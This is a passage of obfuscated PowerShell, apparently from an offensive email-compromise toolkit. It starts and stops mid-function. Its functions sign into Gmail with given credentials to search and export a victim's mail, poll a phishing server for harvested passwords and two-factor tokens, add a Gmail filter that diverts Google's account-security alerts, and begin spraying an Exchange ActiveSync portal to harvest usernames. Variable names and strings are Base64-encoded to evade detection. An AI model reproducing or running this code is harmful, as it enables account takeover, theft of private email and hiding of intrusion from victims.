        ${_/\/=\/\__/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGEAYwBjAG8AdQBuAHQAcwAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGkAZwBuAGkAbgAvAGMAaABhAGwAbABlAG4AZwBlAC8AcwBsAC8AcABhAHMAcwB3AG8AcgBkAA==')))
        ${/=\/\___/\_____/\} = iwr -Uri ${_/\/=\/\__/\/===\} -WebSession $googlesession -Method POST -Body ${__/=\/\/=\_/=\_/\}.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        ${____/\__/\/==\/\/} = $googlesession.Cookies.GetCookies(${_/\/=\/\__/\/===\})
        foreach (${/\____/===\/=\___} in ${____/\__/\/==\/\/})
        {
            if ((${/\____/===\/=\___}.name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA')))) -and (${/\____/===\/=\___}.value -ne ""))
            {
                ${__/==\/\_/\____/\} = $true
            }
        }
        if (${__/==\/\_/\____/\})
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIABhAHAAcABlAGEAcgBzACAAdABvACAAYgBlACAAcwB1AGMAYwBlAHMAcwBmAHUAbAA=')))
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIABhAHAAcABlAGEAcgBzACAAdABvACAAaABhAHYAZQAgAGYAYQBpAGwAZQBkAC4AIABDAGgAZQBjAGsAIAB0AGgAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAuAA==')))
            break
        }
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAZQBhAHIAYwBoAGkAbgBnACAARwBtAGEAaQBsACAAYQBjAGMAbwB1AG4AdAAgACQARQBtAGEAaQBsAEEAZABkAHIAZQBzAHMAIABmAG8AcgA6ACAAJABTAGUAYQByAGMAaAA=')))
        ${______/\/=\__/\__} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBfAGoAcgA9AFsAbgB1AGwAbAAsAFsAWwBuAHUAbABsACwAbgB1AGwAbAAsAG4AdQBsAGwALABuAHUAbABsACwAbgB1AGwAbAAsAG4AdQBsAGwALABbAG4AdQBsAGwALAB0AHIAdQBlACwAZgBhAGwAcwBlAF0AXQAsAFsAbgB1AGwAbAAsAFsAbgB1AGwAbAAsACIAdABlAHMAdAAiACwAMAAsAG4AdQBsAGwALAAzADAALABuAHUAbABsACwAbgB1AGwAbAAsAG4AdQBsAGwALABmAGEAbABzAGUALABbAF0ALABbAF0AXQBdAF0ALAAyACwAbgB1AGwAbAAsAG4AdQBsAGwALABuAHUAbABsACwAIgAiAF0A')))
        ${__/=\_/=====\__/=} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAA='))) -WebSession $googlesession
        ${/=\/\/=\__/\_/=\_} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAAvAHUALwAwAC8AcwAvAD8AdgA9AG8AcgA='))) -WebSession $googlesession -Method POST -Body ${______/\/=\__/\__}
        ${/=\/\/=\__/\_/=\_}.Content -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/ADwAPQB1AHMAZQByACAAawBlAHkAXAAgACcAKQBbAEEALQBaAGEALQB6ADAALQA5AF0AKgAoAD8APQAnAFwAIgApAA=='))) | Out-null
        ${/==\_/\/\_/==\/=\} = $Matches[0]
        ${____/\/\__/==\_/=} = iwr -Uri ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAAvAHUALwAwAC8AIwBzAGUAdAB0AGkAbgBnAHMALwBmAGkAbAB0AGUAcgBzAA==')))) -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHgAdAAvAGgAdABtAGwALAAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAHgAaAB0AG0AbAArAHgAbQBsACwAIABpAG0AYQBnAGUALwBqAHgAcgAsACAAKgAvACoA')))}
        ${____/\/\__/==\_/=}.tostring() -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/ADwAPQBHAE0AXwBBAEMAVABJAE8ATgBfAFQATwBLAEUATgA9AFwAIgApAC4AKgAoAD8APQBcACIAOwB2AGEAcgApAA=='))) | out-null
        ${/=\/=\/=\/\______} = $Matches[0]
        ${_/==\___/=\/\____} = iwr -WebSession $googlesession -Method Post -Uri $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAAvAHUALwAwAC8APwB1AGkAPQAyACYAaQBrAD0AJAB7ADQANQB9ACYAYQB0AD0AJAB7ADQANAB9ACYAdgBpAGUAdwA9AHQAbAAmAHMAdABhAHIAdAA9ADAAJgBuAHUAbQA9ADEAMAAwADAAJgBtAGIAPQAwACYAcgB0AD0AYwAmAHEAPQAkAHMAZQBhAHIAYwBoACYAcwBlAGEAcgBjAGgAPQBxAHUAZQByAHkA')))
        ${__/==\/\/=\_/\/==} = ${_/==\___/=\/\____}.Content -split "\n"
        ${_/\__/\/\___/==\_} = ${__/==\/\/=\_/\/==}[3]
        ${/=\___/=\_/=\__/=} = ${__/==\/\/=\_/\/==}[5]
        ${__/==\/=\/==\__/=} = ${_/\__/\/\___/==\_} | ConvertFrom-Json
        ${/====\/=\_/\_/=\/} = ${/=\___/=\_/=\__/=} | ConvertFrom-Json
        [int]${_/\_/=\/\_/====\/} = ${__/==\/=\/==\__/=}[5][2]
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIAAkAHsAOAAzAH0AIABlAG0AYQBpAGwAcwAgAGYAbwB1AG4AZAAgAHQAaABhAHQAIABtAGEAdABjAGgAIAB0AGgAZQAgAHMAZQBhAHIAYwBoACAAdABlAHIAbQAgACQAcwBlAGEAcgBjAGgALgA=')))
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABHAGUAdAB0AGkAbgBnACAAZQBtAGEAaQBsACAAaQBkAHMA')))
        ${_/\/==\___/=\_/\_} = 0
        ${/=\__/========\/\} = @()
        while (${_/\/==\___/=\_/\_} -lt ${_/\_/=\/\_/====\/})
        {
            ${/=\__/========\/\} += ${/====\/=\_/\_/=\/}[0][2][${_/\/==\___/=\_/\_}][0]
            ${_/\/==\___/=\_/\_}++
        }
        ${/=\/==\/\/=\/=\/=} = @()
        ${/=\/====\_/\/=\/\} = 1
        foreach (${_/\___/\/====\___} in ${/=\__/========\/\})
        {
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGMAaABlAGMAawBpAG4AZwAgAGUAbQBhAGkAbAAgACQAewAzADYAfQAgAG8AZgAgACQAewA4ADMAfQAuAA==')))
            ${/======\_/\/=\_/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBfAGoAcgA9AFsAbgB1AGwAbAAsAFsAWwBuAHUAbABsACwAbgB1AGwAbAAsAFsAbgB1AGwAbAAsACIAJAB7ADgAMgB9ACIALAAiACoAIgAsAGYAYQBsAHMAZQAsAHQAcgB1AGUALAB0AHIAdQBlACwAbgB1AGwAbAAsAG4AdQBsAGwALABuAHUAbABsACwAbgB1AGwAbAAsAG4AdQBsAGwAXQBdAF0ALAAyACwAbgB1AGwAbAAsAG4AdQBsAGwALABuAHUAbABsACwAIgAkAHsANAA1AH0AIgBdAA==')))
            ${/=====\_/==\/\__/} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAAvAHUALwAwAC8AcwAvAD8AdgA9AG8AcgA='))) -WebSession $googlesession -Method POST -Body ${/======\_/\/=\_/=}
            ${____/\/\/===\/=\/} = ${/=====\_/==\/\__/}.Content -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JgBcAFsA')))
            ${____/\/\/===\/=\/} = "[" + ${____/\/\/===\/=\/}[1]
            ${/=\/==\/\/=\/\/=\} = ${____/\/\/===\/=\/} | ConvertFrom-Json
            ${/=\_/\___/\__/\/\} = ${/=\/==\/\/=\/\/=\}[1][0][3][1][5][0][5]
            ${___/\/\____/=\/\_} = ${/=\/==\/\/=\/\/=\}[1][0][3][1][5][0][7]
            ${_/\/=\/\/\__/==\_} = ${/=\/==\/\/=\/\/=\}[1][0][3][1][5][0][8][0][1]
            ${/=\/\___/==\_/=\_} = ${/=\/==\/\/=\/\/=\}[1][0][3][1][5][0][3][0][2]
            ${____/\_/=====\/==} = New-Object System.Object
            ${____/\_/=====\/==} | Add-Member -Type NoteProperty -name Subject -Value ${/=\_/\___/\__/\/\}
            ${____/\_/=====\/==} | Add-Member -Type NoteProperty -name Sender -Value ${___/\/\____/=\/\_}[1]
            ${____/\_/=====\/==} | Add-Member -Type NoteProperty -name Receiver -Value ${_/\/=\/\/\__/==\_}
            ${____/\_/=====\/==} | Add-Member -Type NoteProperty -name Body -Value ${/=\/\___/==\_/=\_}
            ${/=\/==\/\/=\/=\/=} += ${____/\_/=====\/==}
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAagBlAGMAdAA6ACAAJAB7ADcANQB9AA==')))
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABlAHIAOgAgACQAewA3ADQAfQA=')))
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAZQBpAHYAZQByADoAIAAkAHsANwAzAH0A')))     
            echo "`n"
            ${/=\/====\_/\/=\/\}++
        }
        ${/=\/==\/\/=\/=\/=} | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace "`n",'\n' -replace "`r",'\n' -replace ",",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JgAjADQANAA7AA==')))}
        ${/=\/==\/\/=\/=\/=} | epcsv -Encoding UTF8 $OutputCsv
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAGUAcwB1AGwAdABzACAAaABhAHYAZQAgAGIAZQBlAG4AIAB3AHIAaQB0AHQAZQBuACAAdABvACAAJABPAHUAdABwAHUAdABDAHMAdgAuAA==')))
}
Function Invoke-MonitorCredSniper{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $ApiToken = "",
        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $CredSniper = "",
        [Parameter(Position = 2, Mandatory = $false)]
        [int]
        $Interval = 1
    )
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG4AaQB0AGkAYQBsAGkAegBpAG4AZwAgAEMAcgBlAGQAUwBuAGkAcABlAHIAIABtAG8AbgBpAHQAbwByAC4ALgAuAA==')))
    ${/=\_/\/=\/=\/===\} = New-Object System.Collections.ArrayList
    while(1)
    {
        $CredSniper = $CredSniper.trim('/')
        ${_/\/\/\/===\/\/\_} = iwr -Uri $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAHIAZQBkAFMAbgBpAHAAZQByAC8AYwByAGUAZABzAC8AdgBpAGUAdwA/AGEAcABpAF8AdABvAGsAZQBuAD0AJABBAHAAaQBUAG8AawBlAG4A')))
        ${_/==\___/\_/\/=\_} = ${_/\/\/\/===\/\/\_}.Content | ConvertFrom-Json
        foreach(${/=\/====\__/\_/\/} in ${_/==\___/\_/\/=\_}.creds)
        {
            ${________/=\__/\/\} = ${/=\/====\__/\_/\/}.cred_id
            ${/=\_/\__/=\__/\__} = ${/=\/====\__/\_/\/}.ip_address
            $username = ${/=\/====\__/\_/\/}.username
            $password = ${/=\/====\__/\_/\/}.password
            ${_/=\/\/\_/=\_/\/=} = ${/=\/====\__/\_/\/}.city
            ${_/=\_/\/\___/==\_} = ${/=\/====\__/\_/\/}.region
            ${/=\_/=\/\_/\__/\/} = ${/=\/====\__/\_/\/}.zip_code
            ${/=\__/\/\/==\__/=} = ${/=\/====\__/\_/\/}.two_factor_type
            ${_/====\__/\/\_/=\} = ${/=\/====\__/\_/\/}.two_factor_token
            ${/======\_/\/====\} = ${/=\/====\__/\_/\/}.seen
            If (${/=\_/\/=\/=\/===\} -notcontains $username)
            {
                ${/=\_/\/=\/=\/===\}.Add($username) | out-null
                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIAAkAHUAcwBlAHIAbgBhAG0AZQAsACAAJABwAGEAcwBzAHcAbwByAGQALAAgACQAewA2ADQAfQAsACAAJAB7ADYAMwB9ACwAIAAkAHsANgAyAH0ALAAgACQAewA2ADEAfQAsACAAJAB7ADYAMAB9AA==')))
            }
        }
        sleep -seconds $Interval
    }
}
Function Invoke-AddGmailRule{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $EmailAddress = "",
        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $Password = ""
    )
        ${/====\/\__/=\_/\/} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGEAYwBjAG8AdQBuAHQAcwAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGkAZwBuAGkAbgA='))) -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        ${_/======\/==\/===} = ${/====\/\__/=\_/\/}.Forms[0]
        ${_/======\/==\/===}.Fields[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGEAaQBsAA==')))]= $EmailAddress
        ${______/\_/\/\/\/\} = iwr -Uri ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGEAYwBjAG8AdQBuAHQAcwAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGkAZwBuAGkAbgAvAHYAMQAvAGwAbwBvAGsAdQBwAA==')))) -WebSession $googlesession -Method POST -Body ${_/======\/==\/===}.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        ${__/=\/\/=\_/=\_/\} = ${______/\_/\/\/\/\}.Forms[0]
        ${__/=\/\/=\_/=\_/\}.Fields[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGEAaQBsAA==')))]= $EmailAddress
        ${__/=\/\/=\_/=\_/\}.Fields[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AGQA')))]= $Password
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGwAbwBnAGcAaQBuAGcAIABpAG4AdABvACAAYQBjAGMAbwB1AG4AdAAgAHcAaQB0AGgAIABwAHIAbwB2AGkAZABlAGQAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMA')))
        ${_/\/=\/\__/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGEAYwBjAG8AdQBuAHQAcwAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGkAZwBuAGkAbgAvAGMAaABhAGwAbABlAG4AZwBlAC8AcwBsAC8AcABhAHMAcwB3AG8AcgBkAA==')))
        ${/=\/\___/\_____/\} = iwr -Uri ${_/\/=\/\__/\/===\} -WebSession $googlesession -Method POST -Body ${__/=\/\/=\_/=\_/\}.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        ${____/\__/\/==\/\/} = $googlesession.Cookies.GetCookies(${_/\/=\/\__/\/===\})
        foreach (${/\____/===\/=\___} in ${____/\__/\/==\/\/})
        {
            if ((${/\____/===\/=\___}.name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA')))) -and (${/\____/===\/=\___}.value -ne ""))
            {
                ${__/==\/\_/\____/\} = $true
            }
        }
        if (${__/==\/\_/\____/\})
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIABhAHAAcABlAGEAcgBzACAAdABvACAAYgBlACAAcwB1AGMAYwBlAHMAcwBmAHUAbAA=')))
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIABhAHAAcABlAGEAcgBzACAAdABvACAAaABhAHYAZQAgAGYAYQBpAGwAZQBkAC4AIABDAGgAZQBjAGsAIAB0AGgAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAuAA==')))
            break
        }
        ${____/\/\__/==\_/=} = iwr -Uri ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAAvAHUALwAwAC8AIwBzAGUAdAB0AGkAbgBnAHMALwBmAGkAbAB0AGUAcgBzAA==')))) -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHgAdAAvAGgAdABtAGwALAAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAHgAaAB0AG0AbAArAHgAbQBsACwAIABpAG0AYQBnAGUALwBqAHgAcgAsACAAKgAvACoA')))}
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABPAGIAdABhAGkAbgBpAG4AZwAgACcAaQBrACcAIABhAG4AZAAgACcAYQB0ACcA')))
        ${______/\/=\__/\__} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBfAGoAcgA9AFsAbgB1AGwAbAAsAFsAWwBuAHUAbABsACwAbgB1AGwAbAAsAG4AdQBsAGwALABuAHUAbABsACwAbgB1AGwAbAAsAG4AdQBsAGwALABbAG4AdQBsAGwALAB0AHIAdQBlACwAZgBhAGwAcwBlAF0AXQAsAFsAbgB1AGwAbAAsAFsAbgB1AGwAbAAsACIAdABlAHMAdAAiACwAMAAsAG4AdQBsAGwALAAzADAALABuAHUAbABsACwAbgB1AGwAbAAsAG4AdQBsAGwALABmAGEAbABzAGUALABbAF0ALABbAF0AXQBdAF0ALAAyACwAbgB1AGwAbAAsAG4AdQBsAGwALABuAHUAbABsACwAIgAiAF0A')))
        ${__/=\_/=====\__/=} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAA='))) -WebSession $googlesession
        ${/=\/\/=\__/\_/=\_} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAAvAHUALwAwAC8AcwAvAD8AdgA9AG8AcgA='))) -WebSession $googlesession -Method POST -Body ${______/\/=\__/\__}
        ${/=\/\/=\__/\_/=\_}.Content -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/ADwAPQB1AHMAZQByACAAawBlAHkAXAAgACcAKQBbAEEALQBaAGEALQB6ADAALQA5AF0AKgAoAD8APQAnAFwAIgApAA=='))) | out-null
        ${/==\_/\/\_/==\/=\} = $Matches[0]
        ${____/\/\__/==\_/=}.tostring() -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/ADwAPQBHAE0AXwBBAEMAVABJAE8ATgBfAFQATwBLAEUATgA9AFwAIgApAC4AKgAoAD8APQBcACIAOwB2AGEAcgApAA=='))) | out-null
        ${/=\/=\/=\/\______} = $Matches[0]
        ${/==\/==\_/\/\/\__} = @{'Accept'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAvACoA')));'X-Same-Domain'='1';'Content-Type'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAbABpAGMAYQB0AGkAbwBuAC8AeAAtAHcAdwB3AC0AZgBvAHIAbQAtAHUAcgBsAGUAbgBjAG8AZABlAGQAOwBjAGgAYQByAHMAZQB0AD0AdQB0AGYALQA4AA==')));'Referer'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AcgBlAG4AZABlAHIAPwBwAGwAaQA9ADEA')));'Accept-Language'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBuAC0AVQBTAA==')));'Accept-Encoding'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwB6AGkAcAA7ACAAZABlAGYAbABhAHQAZQA=')));'User-Agent'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAAMQAwAC4AMAA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA9ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8A')));'Host'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBhAGkAbAAuAGcAbwBvAGcAbABlAC4AYwBvAG0A')));'Cache-Control'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBvAC0AYwBhAGMAaABlAA==')))}
        ${_/===\/=\_/=\/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGEAcgBjAGgAPQBjAGYAJgBjAGYAMQBfAGYAcgBvAG0APQBuAG8ALQByAGUAcABsAHkAJQA0ADAAYQBjAGMAbwB1AG4AdABzAC4AZwBvAG8AZwBsAGUALgBjAG8AbQAmAGMAZgAxAF8AcwBpAHoAZQBvAHAAZQByAGEAdABvAHIAPQBzAF8AcwBsACYAYwBmADEAXwBzAGkAegBlAHUAbgBpAHQAPQBzAF8AcwBtAGIAJgBjAGYAMgBfAHQAcgA9AHQAcgB1AGUAJgA=')))
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGEAZABkAGkAbgBnACAAZgBpAGwAdABlAHIAIAByAHUAbABlACAAaQBuAHQAbwAgAEcAbQBhAGkAbAAgAHMAZQB0AHQAaQBuAGcAcwA=')))
        ${_/=\_/\/==\/\/\_/} = iwr -Uri $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAAvAHUALwAwAC8APwB1AGkAPQAyACYAaQBrAD0AJAB7ADQANQB9ACYAagBzAHYAZQByAD0AYQAmAHIAaQBkAD0AYQAmAGEAdAA9ACQAewA0ADQAfQAmAHYAaQBlAHcAPQB1AHAAJgBhAGMAdAA9AGMAZgAmAF8AcgBlAHEAaQBkAD0AYQAmAHAAYwBkAD0AMQAmAGMAZgBhAGMAdAA9AGEAJgBjAGYAaQBuAGEAYwB0AD0AYQAmAG0AYgA9ADAAJgByAHQAPQBjACYAcwBlAGEAcgBjAGgAPQBjAGYAJgBjAGYAMQBfAGYAcgBvAG0APQBuAG8ALQByAGUAcABsAHkAJQA0ADAAYQBjAGMAbwB1AG4AdABzAC4AZwBvAG8AZwBsAGUALgBjAG8AbQAmAGMAZgAxAF8AcwBpAHoAZQBvAHAAZQByAGEAdABvAHIAPQBzAF8AcwBsACYAYwBmADEAXwBzAGkAegBlAHUAbgBpAHQAPQBzAF8AcwBtAGIA'))) -WebSession $googlesession -Method POST -Headers ${/==\/==\_/\/\/\__} -Body ${_/===\/=\_/=\/=\_}
        ${/=\_/\/===\__/=\/} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AYQBpAGwALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AbQBhAGkAbAAvAHUALwAwAC8AIwBzAGUAdAB0AGkAbgBnAHMALwBmAGkAbAB0AGUAcgBzAA=='))) -WebSession $googlesession -Method GET -Headers ${/==\/==\_/\/\/\__}
        if(${/=\_/\/===\__/=\/}.tostring() -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBvAC0AcgA8AHcAYgByAD4AZQBwAGwAeQBAAGEAYwBjAG8AdQA8AHcAYgByAD4AbgB0AHMALgBnAG8AbwBnAGwAZQA8AHcAYgByAD4ALgBjAG8AbQA='))))
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBMAG8AbwBrAHMAIABsAGkAawBlACAAcwBvAG0AZQB0AGgAaQBuAGcAIABtAGEAeQAgAGgAYQB2AGUAIABnAG8AbgBlACAAdwByAG8AbgBnAC4AIABNAGEAeQBiAGUAIABsAG8AZwBpAG4AIAB0AG8AIABHAG0AYQBpAGwAIABkAGkAcgBlAGMAdABsAHkAIABhAG4AZAAgAGMAaABlAGMAawAgAHQAbwAgAHMAZQBlACAAaQBmACAAdABoAGUAIAByAHUAbABlACAAdwBhAHMAIABjAHIAZQBhAHQAZQBkAC4A')))
        } else {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAHUAYwBjAGUAcwBzACEAIABUAGgAZQAgAHIAdQBsAGUAIABoAGEAcwAgAGIAZQBlAG4AIABhAGQAZABlAGQAIABzAHUAYwBjAGUAcwBzAGYAdQBsAHkACgA=')))
        }
}
function Invoke-UsernameHarvestEAS {
  Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $OutFile = "",
    [Parameter(Position = 2, Mandatory = $True)]
    [string]
    $UserList = "",
    [Parameter(Position = 3, Mandatory = $True)]
    [string]
    $Domain = "",
	[Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Password = "",
    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $Threads = "1"
  )
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAcAByAGEAeQBpAG4AZwAgAEUAQQBTACAAcABvAHIAdABhAGwAIABhAHQAIABoAHQAdABwAHMAOgAvAC8AJABFAHgAYwBoAEgAbwBzAHQAbgBhAG0AZQAvAE0AaQBjAHIAbwBzAG8AZgB0AC0AUwBlAHIAdgBlAHIALQBBAGMAdABpAHYAZQBTAHkAbgBjAA==')))
    ${___/==\____/\/=\_/} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBNAGkAYwByAG8AcwBvAGYAdAAtAFMAZQByAHYAZQByAC0AQQBjAHQAaQB2AGUAUwB5AG4AYwA='))))
    ${__/\_/=\_/=\_/\_/} = @()
    ${__/\_/=\_/=\_/\_/} += gc $UserList
    ${______/=\__/\/\__} = @()
    ${/=\/====\_/\/=\/\} = ${__/\_/=\_/=\_/\_/}.count
    if ($Password -eq "") {
        $Password = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
    }
    ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
    ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
    ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
    ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
    ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
    ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
    ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
